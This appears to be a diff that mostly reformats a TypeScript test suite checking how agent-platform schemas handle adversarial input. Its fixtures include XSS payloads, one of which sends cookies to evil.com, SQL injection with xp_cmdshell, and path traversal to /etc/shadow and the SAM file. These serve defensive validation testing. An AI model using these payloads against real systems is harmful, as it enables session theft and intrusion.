@@ -39,7 +39,7 @@ import {
   ToolInvocationSchema,
   UpdateRecordActionIntentSchema,
   WorkflowDagNodeStatusSchema,
-  WorkflowDagStatusSchema
+  WorkflowDagStatusSchema,
 } from "@agentic/contracts";
 
 /**
@@ -71,43 +71,46 @@ describe("adversarial malformed input: XSS payloads in user-facing text fields",
     "<script>alert('xss')</script>",
     "<img src=x onerror=alert(1)>",
     "<svg/onload=alert(1)>",
-    "<a href=\"javascript:alert(1)\">click</a>",
-    "\"><script>alert(1)</script>",
+    '<a href="javascript:alert(1)">click</a>',
+    '"><script>alert(1)</script>',
     "<img src=x onerror='fetch(\"https://evil.com/?c=\"+document.cookie)'>",
     "{{constructor.constructor('return this')()}}",
     "${7*7}",
     "<details open ontoggle=alert(1)>",
-    "<iframe srcdoc=\"<script>alert(1)</script>\">"
+    '<iframe srcdoc="<script>alert(1)</script>">',
   ];
 
-  it.each(xssPayloads)("XSS payload in MemoryRecordSchema content is accepted as data (schema is not a sanitizer) but trimmed content is preserved", (payload) => {
-    const record = MemoryRecordSchema.safeParse({
-      id: "mem-1",
-      userId: "owner",
-      category: "style",
-      memoryType: "observed",
-      content: payload,
-      confidence: 0.5,
-      source: "test",
-      sensitivity: "low",
-      createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
-    });
+  it.each(xssPayloads)(
+    "XSS payload in MemoryRecordSchema content is accepted as data (schema is not a sanitizer) but trimmed content is preserved",
+    (payload) => {
+      const record = MemoryRecordSchema.safeParse({
+        id: "mem-1",
+        userId: "owner",
+        category: "style",
+        memoryType: "observed",
+        content: payload,
+        confidence: 0.5,
+        source: "test",
+        sensitivity: "low",
+        createdAt: "2026-06-09T12:00:00.000Z",
+        updatedAt: "2026-06-09T12:00:00.000Z",
+      });
 
-    // The schema accepts arbitrary text (it's a data store, not a sanitizer).
-    // The test pins that the payload is stored verbatim -- downstream renderers
-    // MUST escape, not the schema.
-    if (record.success) {
-      expect(record.data.content).toBe(payload);
-    }
-  });
+      // The schema accepts arbitrary text (it's a data store, not a sanitizer).
+      // The test pins that the payload is stored verbatim -- downstream renderers
+      // MUST escape, not the schema.
+      if (record.success) {
+        expect(record.data.content).toBe(payload);
+      }
+    },
+  );
 
   it("rejects XSS payload that is also invisible-only (zero-width + script tag)", () => {
     const result = SendMessageActionIntentSchema.safeParse({
       type: "send_message",
       to: "client@example.com",
       subject: "\u200b<script>alert(1)</script>",
-      body: "Approved response body."
+      body: "Approved response body.",
     });
 
     // The subject has visible text after zero-width chars, so it passes the visible-code-point
@@ -125,7 +128,7 @@ describe("adversarial malformed input: XSS payloads in user-facing text fields",
       "admin'--",
       "'; EXEC xp_cmdshell('whoami'); --",
       "1; UPDATE goals SET title='hacked' WHERE '1'='1",
-      "' UNION SELECT * FROM passwords --"
+      "' UNION SELECT * FROM passwords --",
     ];
 
     for (const payload of sqliPayloads) {
@@ -139,7 +142,7 @@ describe("adversarial malformed input: XSS payloads in user-facing text fields",
         source: "test",
         sensitivity: "low",
         createdAt: "2026-06-09T12:00:00.000Z",
-        updatedAt: "2026-06-09T12:00:00.000Z"
+        updatedAt: "2026-06-09T12:00:00.000Z",
       });
 
       // SQL injection payloads are accepted as data -- the schema is not a SQL filter.
@@ -165,7 +168,7 @@ describe("adversarial malformed input: extremely long strings", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(record.content).toBe(hugeContent);
@@ -180,7 +183,7 @@ describe("adversarial malformed input: extremely long strings", () => {
       artifactType: "summary",
       title: "Big artifact",
       content: hugeContent,
-      createdAt: "2026-06-09T12:00:00.000Z"
+      createdAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(artifact.content).toBe(hugeContent);
@@ -192,7 +195,7 @@ describe("adversarial malformed input: extremely long strings", () => {
       type: "send_message",
       to: "client@example.com",
       subject: "Test",
-      body: "a".repeat(20_001)
+      body: "a".repeat(20_001),
     });
 
     expect(result.success).toBe(false);
@@ -203,7 +206,7 @@ describe("adversarial malformed input: extremely long strings", () => {
       type: "send_message",
       to: "client@example.com",
       subject: "Test",
-      body: "a".repeat(20_000)
+      body: "a".repeat(20_000),
     });
 
     expect(result.success).toBe(true);
@@ -213,7 +216,7 @@ describe("adversarial malformed input: extremely long strings", () => {
     const result = CreateNoteActionIntentSchema.safeParse({
       type: "create_note",
       title: "a".repeat(241),
-      content: "Notes."
+      content: "Notes.",
     });
 
     expect(result.success).toBe(false);
@@ -223,7 +226,7 @@ describe("adversarial malformed input: extremely long strings", () => {
     const result = CreateNoteActionIntentSchema.safeParse({
       type: "create_note",
       title: "a".repeat(240),
-      content: "Notes."
+      content: "Notes.",
     });
 
     expect(result.success).toBe(true);
@@ -302,28 +305,49 @@ describe("adversarial malformed input: enum validation with invalid values", () 
   });
 
   it("pins credential status and secret kind enums reject hostile values", () => {
-    expect(ProviderCredentialStatusSchema.safeParse("connected").success).toBe(true);
-    expect(ProviderCredentialStatusSchema.safeParse("hacked").success).toBe(false);
+    expect(ProviderCredentialStatusSchema.safeParse("connected").success).toBe(
+      true,
+    );
+    expect(ProviderCredentialStatusSchema.safeParse("hacked").success).toBe(
+      false,
+    );
     expect(ProviderCredentialStatusSchema.safeParse("").success).toBe(false);
-    expect(ProviderCredentialSecretKindSchema.safeParse("oauth_refresh_token").success).toBe(true);
-    expect(ProviderCredentialSecretKindSchema.safeParse("password").success).toBe(false);
-    expect(ProviderCredentialSecretKindSchema.safeParse("api_key").success).toBe(false);
+    expect(
+      ProviderCredentialSecretKindSchema.safeParse("oauth_refresh_token")
+        .success,
+    ).toBe(true);
+    expect(
+      ProviderCredentialSecretKindSchema.safeParse("password").success,
+    ).toBe(false);
+    expect(
+      ProviderCredentialSecretKindSchema.safeParse("api_key").success,
+    ).toBe(false);
   });
 
   it("pins operator product status and readiness enums to exact documented values", () => {
     expect(OperatorProductStatusSchema.safeParse("active").success).toBe(true);
     expect(OperatorProductStatusSchema.safeParse("Active").success).toBe(false);
-    expect(OperatorProductStatusSchema.safeParse("published").success).toBe(false);
-    expect(OperatorProductReadinessSchema.safeParse("ready").success).toBe(true);
-    expect(OperatorProductReadinessSchema.safeParse("not_ready").success).toBe(false);
-    expect(OperatorProductReadinessSchema.safeParse("required").success).toBe(false);
+    expect(OperatorProductStatusSchema.safeParse("published").success).toBe(
+      false,
+    );
+    expect(OperatorProductReadinessSchema.safeParse("ready").success).toBe(
+      true,
+    );
+    expect(OperatorProductReadinessSchema.safeParse("not_ready").success).toBe(
+      false,
+    );
+    expect(OperatorProductReadinessSchema.safeParse("required").success).toBe(
+      false,
+    );
   });
 
   it("pins workflow DAG status enums reject hostile values", () => {
     expect(WorkflowDagStatusSchema.safeParse("queued").success).toBe(true);
     expect(WorkflowDagStatusSchema.safeParse("deleted").success).toBe(false);
     expect(WorkflowDagNodeStatusSchema.safeParse("running").success).toBe(true);
-    expect(WorkflowDagNodeStatusSchema.safeParse("terminated").success).toBe(false);
+    expect(WorkflowDagNodeStatusSchema.safeParse("terminated").success).toBe(
+      false,
+    );
   });
 });
 
@@ -339,7 +363,7 @@ describe("adversarial malformed input: type mismatches", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -356,7 +380,7 @@ describe("adversarial malformed input: type mismatches", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -373,7 +397,7 @@ describe("adversarial malformed input: type mismatches", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -390,7 +414,7 @@ describe("adversarial malformed input: type mismatches", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -407,7 +431,7 @@ describe("adversarial malformed input: type mismatches", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -424,7 +448,7 @@ describe("adversarial malformed input: type mismatches", () => {
       riskClass: "R2",
       requiresApproval: "true",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -441,7 +465,7 @@ describe("adversarial malformed input: type mismatches", () => {
       riskClass: "R2",
       requiresApproval: 1,
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -450,7 +474,18 @@ describe("adversarial malformed input: type mismatches", () => {
 
 describe("adversarial malformed input: missing required fields", () => {
   it("rejects MemoryRecordSchema with missing required fields", () => {
-    const requiredFields = ["id", "userId", "category", "memoryType", "content", "confidence", "source", "sensitivity", "createdAt", "updatedAt"];
+    const requiredFields = [
+      "id",
+      "userId",
+      "category",
+      "memoryType",
+      "content",
+      "confidence",
+      "source",
+      "sensitivity",
+      "createdAt",
+      "updatedAt",
+    ];
 
     for (const field of requiredFields) {
       const base = {
@@ -463,7 +498,7 @@ describe("adversarial malformed input: missing required fields", () => {
         source: "test",
         sensitivity: "low",
         createdAt: "2026-06-09T12:00:00.000Z",
-        updatedAt: "2026-06-09T12:00:00.000Z"
+        updatedAt: "2026-06-09T12:00:00.000Z",
       };
       delete (base as Record<string, unknown>)[field];
 
@@ -478,7 +513,7 @@ describe("adversarial malformed input: missing required fields", () => {
 
   it("rejects SendMessageActionIntentSchema with missing required fields", () => {
     const result = SendMessageActionIntentSchema.safeParse({
-      type: "send_message"
+      type: "send_message",
       // missing: to, subject, body
     });
 
@@ -492,7 +527,18 @@ describe("adversarial malformed input: missing required fields", () => {
   });
 
   it("rejects TaskSchema with missing required fields", () => {
-    const requiredFields = ["id", "goalId", "title", "summary", "assignedAgent", "state", "riskClass", "requiresApproval", "createdAt", "updatedAt"];
+    const requiredFields = [
+      "id",
+      "goalId",
+      "title",
+      "summary",
+      "assignedAgent",
+      "state",
+      "riskClass",
+      "requiresApproval",
+      "createdAt",
+      "updatedAt",
+    ];
 
     for (const field of requiredFields) {
       const base = {
@@ -505,7 +551,7 @@ describe("adversarial malformed input: missing required fields", () => {
         riskClass: "R2",
         requiresApproval: false,
         createdAt: "2026-06-09T12:00:00.000Z",
-        updatedAt: "2026-06-09T12:00:00.000Z"
+        updatedAt: "2026-06-09T12:00:00.000Z",
       };
       delete (base as Record<string, unknown>)[field];
 
@@ -515,7 +561,14 @@ describe("adversarial malformed input: missing required fields", () => {
   });
 
   it("rejects ArtifactSchema with missing required fields", () => {
-    const requiredFields = ["id", "goalId", "artifactType", "title", "content", "createdAt"];
+    const requiredFields = [
+      "id",
+      "goalId",
+      "artifactType",
+      "title",
+      "content",
+      "createdAt",
+    ];
 
     for (const field of requiredFields) {
       const base = {
@@ -524,7 +577,7 @@ describe("adversarial malformed input: missing required fields", () => {
         artifactType: "summary",
         title: "Test artifact",
         content: "Test content",
-        createdAt: "2026-06-09T12:00:00.000Z"
+        createdAt: "2026-06-09T12:00:00.000Z",
       };
       delete (base as Record<string, unknown>)[field];
 
@@ -541,7 +594,7 @@ describe("adversarial malformed input: extra unexpected fields on strict schemas
       to: "client@example.com",
       subject: "Test",
       body: "Body text",
-      unexpectedField: "injected"
+      unexpectedField: "injected",
     });
 
     expect(result.success).toBe(false);
@@ -553,7 +606,7 @@ describe("adversarial malformed input: extra unexpected fields on strict schemas
       title: "Test note",
       content: "Notes.",
       __proto__: { admin: true },
-      adminFlag: true
+      adminFlag: true,
     });
 
     expect(result.success).toBe(false);
@@ -566,7 +619,7 @@ describe("adversarial malformed input: extra unexpected fields on strict schemas
       targetId: "goal-1",
       reason: "Update",
       patch: { title: "New title" },
-      forceAdmin: true
+      forceAdmin: true,
     });
 
     expect(result.success).toBe(false);
@@ -578,7 +631,7 @@ describe("adversarial malformed input: extra unexpected fields on strict schemas
       memoryType: "observed",
       summary: "Test",
       confidence: 0.5,
-      injected: true
+      injected: true,
     });
 
     expect(result.success).toBe(false);
@@ -590,7 +643,7 @@ describe("adversarial malformed input: extra unexpected fields on strict schemas
       capability: "send",
       label: "Send email",
       input: {},
-      extraParam: "value"
+      extraParam: "value",
     });
 
     // ToolInvocationSchema is not .strict(), so it accepts extra fields.
@@ -605,7 +658,7 @@ describe("adversarial malformed input: hostile record/object keys", () => {
       adapterKey: "gmail",
       capability: "send",
       label: "Send email",
-      input: { "": "empty key value" }
+      input: { "": "empty key value" },
     });
 
     expect(result.success).toBe(true);
@@ -619,7 +672,7 @@ describe("adversarial malformed input: hostile record/object keys", () => {
       adapterKey: "gmail",
       capability: "send",
       label: "Send email",
-      input: { "0": "zero", "999": "large" }
+      input: { "0": "zero", "999": "large" },
     });
 
     expect(result.success).toBe(true);
@@ -630,7 +683,7 @@ describe("adversarial malformed input: hostile record/object keys", () => {
       adapterKey: "gmail",
       capability: "send",
       label: "Send email",
-      input: { "../etc/passwd": "path traversal key", "<script>": "xss key" }
+      input: { "../etc/passwd": "path traversal key", "<script>": "xss key" },
     });
 
     expect(result.success).toBe(true);
@@ -646,8 +699,8 @@ describe("adversarial malformed input: hostile record/object keys", () => {
       subject: "Test",
       body: "Body text",
       metadata: {
-        nested: { deep: "object" }
-      }
+        nested: { deep: "object" },
+      },
     });
 
     expect(result.success).toBe(false);
@@ -663,8 +716,8 @@ describe("adversarial malformed input: hostile record/object keys", () => {
         str: "value",
         num: 42,
         bool: true,
-        nil: null
-      }
+        nil: null,
+      },
     });
 
     expect(result.success).toBe(true);
@@ -683,7 +736,7 @@ describe("adversarial malformed input: Unicode normalization attacks", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     // Zero-width chars are NOT stripped by String.prototype.trim, so after trim the string
@@ -705,7 +758,7 @@ describe("adversarial malformed input: Unicode normalization attacks", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     // Combining characters alone are technically non-empty strings after trim.
@@ -739,11 +792,15 @@ describe("adversarial malformed input: numeric boundary values", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     };
 
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: 0 }).success).toBe(true);
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: 1 }).success).toBe(true);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, confidence: 0 }).success,
+    ).toBe(true);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, confidence: 1 }).success,
+    ).toBe(true);
   });
 
   it("confidence just beyond boundaries (-0.001, 1.001) is rejected", () => {
@@ -756,11 +813,15 @@ describe("adversarial malformed input: numeric boundary values", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     };
 
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: -0.001 }).success).toBe(false);
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: 1.001 }).success).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, confidence: -0.001 }).success,
+    ).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, confidence: 1.001 }).success,
+    ).toBe(false);
   });
 
   it("confidence rejects NaN and Infinity", () => {
@@ -773,19 +834,31 @@ describe("adversarial malformed input: numeric boundary values", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     };
 
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: Number.NaN }).success).toBe(false);
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: Number.POSITIVE_INFINITY }).success).toBe(false);
-    expect(MemoryRecordSchema.safeParse({ ...base, confidence: Number.NEGATIVE_INFINITY }).success).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, confidence: Number.NaN }).success,
+    ).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({
+        ...base,
+        confidence: Number.POSITIVE_INFINITY,
+      }).success,
+    ).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({
+        ...base,
+        confidence: Number.NEGATIVE_INFINITY,
+      }).success,
+    ).toBe(false);
   });
 
   it("AgentMemoryUpdateProposalSchema confidence defaults to 0.5 when omitted", () => {
     const result = AgentMemoryUpdateProposalSchema.parse({
       category: "style",
       memoryType: "observed",
-      summary: "Test"
+      summary: "Test",
     });
 
     expect(result.confidence).toBe(0.5);
@@ -802,7 +875,7 @@ describe("adversarial malformed input: numeric boundary values", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.version).toBe(1);
@@ -819,12 +892,18 @@ describe("adversarial malformed input: numeric boundary values", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     };
 
-    expect(MemoryRecordSchema.safeParse({ ...base, version: 1.5 }).success).toBe(false);
-    expect(MemoryRecordSchema.safeParse({ ...base, version: 0 }).success).toBe(false);
-    expect(MemoryRecordSchema.safeParse({ ...base, version: -1 }).success).toBe(false);
+    expect(
+      MemoryRecordSchema.safeParse({ ...base, version: 1.5 }).success,
+    ).toBe(false);
+    expect(MemoryRecordSchema.safeParse({ ...base, version: 0 }).success).toBe(
+      false,
+    );
+    expect(MemoryRecordSchema.safeParse({ ...base, version: -1 }).success).toBe(
+      false,
+    );
   });
 });
 
@@ -841,7 +920,7 @@ describe("adversarial malformed input: array boundary attacks", () => {
       confidence: 0.5,
       evidence: [],
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -859,33 +938,39 @@ describe("adversarial malformed input: array boundary attacks", () => {
       confidence: 0.5,
       evidence: [{ section: "goals", itemId: "goal-1", label: "Test" }],
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(true);
   });
 
   it("rejects oversized attendees array (max 50) in ScheduleEventActionIntentSchema", () => {
-    const attendees = Array.from({ length: 51 }, (_, i) => `user${i}@example.com`);
+    const attendees = Array.from(
+      { length: 51 },
+      (_, i) => `user${i}@example.com`,
+    );
     const result = ScheduleEventActionIntentSchema.safeParse({
       type: "schedule_event",
       summary: "Test event",
       start: "2026-06-09T12:00:00.000Z",
       end: "2026-06-09T13:00:00.000Z",
-      attendees
+      attendees,
     });
 
     expect(result.success).toBe(false);
   });
 
   it("accepts exactly 50 attendees (boundary)", () => {
-    const attendees = Array.from({ length: 50 }, (_, i) => `user${i}@example.com`);
+    const attendees = Array.from(
+      { length: 50 },
+      (_, i) => `user${i}@example.com`,
+    );
     const result = ScheduleEventActionIntentSchema.safeParse({
       type: "schedule_event",
       summary: "Test event",
       start: "2026-06-09T12:00:00.000Z",
       end: "2026-06-09T13:00:00.000Z",
-      attendees
+      attendees,
     });
 
     expect(result.success).toBe(true);
@@ -898,7 +983,7 @@ describe("adversarial malformed input: array boundary attacks", () => {
       actionType: "send",
       summary: "Review",
       reason: "Needs review",
-      artifactIds
+      artifactIds,
     });
 
     expect(result.success).toBe(false);
@@ -911,7 +996,7 @@ describe("adversarial malformed input: array boundary attacks", () => {
       targetEntity: "goal-1",
       condition: "threshold crossed",
       triggerAction: "notify",
-      sourceSystems
+      sourceSystems,
     });
 
     expect(result.success).toBe(false);
@@ -924,7 +1009,7 @@ describe("adversarial malformed input: discriminated union type field", () => {
       type: "unknown_action",
       to: "client@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
@@ -934,7 +1019,7 @@ describe("adversarial malformed input: discriminated union type field", () => {
     const result = ActionIntentSchema.safeParse({
       to: "client@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
@@ -945,7 +1030,7 @@ describe("adversarial malformed input: discriminated union type field", () => {
       type: 123,
       to: "client@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
@@ -956,7 +1041,7 @@ describe("adversarial malformed input: discriminated union type field", () => {
       type: null,
       to: "client@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
@@ -967,26 +1052,30 @@ describe("adversarial malformed input: discriminated union type field", () => {
       type: "",
       to: "client@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
   });
 
   it("rejects case-mismatch type field", () => {
-    expect(ActionIntentSchema.safeParse({
-      type: "Send_Message",
-      to: "client@example.com",
-      subject: "Test",
-      body: "Body"
-    }).success).toBe(false);
+    expect(
+      ActionIntentSchema.safeParse({
+        type: "Send_Message",
+        to: "client@example.com",
+        subject: "Test",
+        body: "Body",
+      }).success,
+    ).toBe(false);
 
-    expect(ActionIntentSchema.safeParse({
-      type: "SEND_MESSAGE",
-      to: "client@example.com",
-      subject: "Test",
-      body: "Body"
-    }).success).toBe(false);
+    expect(
+      ActionIntentSchema.safeParse({
+        type: "SEND_MESSAGE",
+        to: "client@example.com",
+        subject: "Test",
+        body: "Body",
+      }).success,
+    ).toBe(false);
   });
 });
 
@@ -1000,7 +1089,7 @@ describe("adversarial malformed input: datetime field attacks", () => {
       content: "Test",
       confidence: 0.5,
       source: "test",
-      sensitivity: "low"
+      sensitivity: "low",
     };
 
     const invalidDates = [
@@ -1011,11 +1100,15 @@ describe("adversarial malformed input: datetime field attacks", () => {
       "2026-06-09T12:00:00",
       "2026-06-09T12:00:00+08:00",
       "2026-06-09T12:00:00Z+00:00",
-      "1717948800000"
+      "1717948800000",
     ];
 
     for (const createdAt of invalidDates) {
-      const result = MemoryRecordSchema.safeParse({ ...base, createdAt, updatedAt: "2026-06-09T12:00:00.000Z" });
+      const result = MemoryRecordSchema.safeParse({
+        ...base,
+        createdAt,
+        updatedAt: "2026-06-09T12:00:00.000Z",
+      });
       expect(result.success).toBe(false);
     }
   });
@@ -1030,7 +1123,7 @@ describe("adversarial malformed input: datetime field attacks", () => {
       confidence: 0.5,
       source: "test",
       sensitivity: "low",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     };
 
     const validDates = [
@@ -1038,7 +1131,7 @@ describe("adversarial malformed input: datetime field attacks", () => {
       "2026-06-09T12:00:00.000Z",
       "2026-06-09T12:00:00.123Z",
       "2026-12-31T23:59:59.999Z",
-      "1970-01-01T00:00:00Z"
+      "1970-01-01T00:00:00Z",
     ];
 
     for (const createdAt of validDates) {
@@ -1058,7 +1151,7 @@ describe("adversarial malformed input: datetime field attacks", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00+08:00",
-      updatedAt: "2026-06-09T12:00:00+08:00"
+      updatedAt: "2026-06-09T12:00:00+08:00",
     });
 
     expect(result.success).toBe(false);
@@ -1083,7 +1176,7 @@ describe("adversarial malformed input: AgentNameSchema enum attacks", () => {
       "travel",
       "personal-admin",
       "finance-support",
-      "orchestrator"
+      "orchestrator",
     ];
 
     for (const agent of validAgents) {
@@ -1105,9 +1198,9 @@ describe("adversarial malformed input: email validation attacks", () => {
       "@example.com",
       "user@",
       "user@.com",
-      "user@example",  // Zod requires a dot in the domain
+      "user@example", // Zod requires a dot in the domain
       "user @example.com",
-      "user@example.com; user2@example.com"  // semicolon not allowed
+      "user@example.com; user2@example.com", // semicolon not allowed
     ];
 
     for (const email of invalidEmails) {
@@ -1115,7 +1208,7 @@ describe("adversarial malformed input: email validation attacks", () => {
         type: "send_message",
         to: email,
         subject: "Test",
-        body: "Body"
+        body: "Body",
       });
       expect(result.success).toBe(false);
     }
@@ -1131,7 +1224,7 @@ describe("adversarial malformed input: email validation attacks", () => {
       type: "send_message",
       to: "user@example",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
     // Zod v4 may or may not accept bare domains depending on version.
     // This test pins the current behavior.
@@ -1143,7 +1236,7 @@ describe("adversarial malformed input: email validation attacks", () => {
       type: "send_message",
       to: " user@example.com",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
     expect(leadingSpace.success).toBe(true);
 
@@ -1151,7 +1244,7 @@ describe("adversarial malformed input: email validation attacks", () => {
       type: "send_message",
       to: "user@example.com ",
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
     expect(trailingSpace.success).toBe(true);
   });
@@ -1162,7 +1255,7 @@ describe("adversarial malformed input: email validation attacks", () => {
       "user.name@example.com",
       "user+tag@example.com",
       "user@sub.example.com",
-      "user@xn--exmple-cua.com"
+      "user@xn--exmple-cua.com",
     ];
 
     for (const email of validEmails) {
@@ -1170,7 +1263,7 @@ describe("adversarial malformed input: email validation attacks", () => {
         type: "send_message",
         to: email,
         subject: "Test",
-        body: "Body"
+        body: "Body",
       });
       expect(result.success).toBe(true);
     }
@@ -1180,12 +1273,12 @@ describe("adversarial malformed input: email validation attacks", () => {
     // The max(320) is on the whole email after trim. A 310-char local part + @example.com (12 chars) = 322 chars
     const longEmail = "a".repeat(310) + "@example.com";
     expect(longEmail.length).toBeGreaterThan(320);
-    
+
     const result = SendMessageActionIntentSchema.safeParse({
       type: "send_message",
       to: longEmail,
       subject: "Test",
-      body: "Body"
+      body: "Body",
     });
 
     expect(result.success).toBe(false);
@@ -1198,7 +1291,7 @@ describe("adversarial malformed input: ContextPacket schema attacks", () => {
       kind: "memory",
       id: "mem-1",
       summary: "Test summary",
-      extraField: "injected"
+      extraField: "injected",
     });
 
     expect(result.success).toBe(false);
@@ -1209,7 +1302,7 @@ describe("adversarial malformed input: ContextPacket schema attacks", () => {
       basis: "explicit",
       grantedBy: "owner",
       grantedAt: "2026-06-09T12:00:00.000Z",
-      extraField: "injected"
+      extraField: "injected",
     });
 
     expect(result.success).toBe(false);
@@ -1219,7 +1312,7 @@ describe("adversarial malformed input: ContextPacket schema attacks", () => {
     const result = ContextPacketSourceSchema.safeParse({
       kind: "memory",
       id: "mem-1",
-      summary: "a".repeat(281)
+      summary: "a".repeat(281),
     });
 
     expect(result.success).toBe(false);
@@ -1229,7 +1322,7 @@ describe("adversarial malformed input: ContextPacket schema attacks", () => {
     const result = ContextPacketSourceSchema.safeParse({
       kind: "memory",
       id: "mem-1",
-      summary: "a".repeat(280)
+      summary: "a".repeat(280),
     });
 
     expect(result.success).toBe(true);
@@ -1253,7 +1346,7 @@ describe("adversarial malformed input: null and undefined handling", () => {
       expiryAt: null,
       validFrom: null,
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(true);
@@ -1270,7 +1363,7 @@ describe("adversarial malformed input: null and undefined handling", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -1287,7 +1380,7 @@ describe("adversarial malformed input: null and undefined handling", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -1301,7 +1394,7 @@ describe("adversarial malformed input: path traversal in text fields", () => {
       "..\\..\\windows\\system32",
       "/etc/shadow",
       "C:\\Windows\\System32\\config\\SAM",
-      "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     ];
 
     for (const payload of pathTraversalPayloads) {
@@ -1315,7 +1408,7 @@ describe("adversarial malformed input: path traversal in text fields", () => {
         source: "test",
         sensitivity: "low",
         createdAt: "2026-06-09T12:00:00.000Z",
-        updatedAt: "2026-06-09T12:00:00.000Z"
+        updatedAt: "2026-06-09T12:00:00.000Z",
       });
 
       // Path traversal in free-text fields is accepted as data.
